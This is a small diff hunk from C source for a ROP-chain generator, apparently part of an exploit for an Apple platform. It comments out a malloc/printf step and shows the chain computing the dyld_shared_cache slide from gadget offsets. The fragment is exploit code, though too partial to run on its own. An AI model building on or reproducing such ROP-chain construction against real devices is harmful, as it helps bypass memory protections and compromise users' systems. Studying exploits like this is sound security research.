@@ -281,13 +281,14 @@ rop_chain_shit gen_rop_chain(uint32_t base,
 
 //	CALL_4_ARG_L2_0(base + 0x9ad8c, LOG_SYSLOG, base + we_out_here_addr);
 
-	/* allocate memory for file read later */
+/*
+	/* allocate memory for file read later *\/
 	CALL_1ARG(base + malloc_addr, 0x100000);
 	STR_R0(base + reserve_addr);
 	MOV_R1_R0();
 
-	/* output malloc string */
-	CALL_1ARG(base + printf_addr, base + malloc_status_addr);
+	/* output malloc string *\/
+	CALL_1ARG(base + printf_addr, base + malloc_status_addr);*/
 
 	/* calculate dyld_shared_cache slide */
 	MOV_R0(0 - (0x20000000 + scprefcreate_dsc_offset));
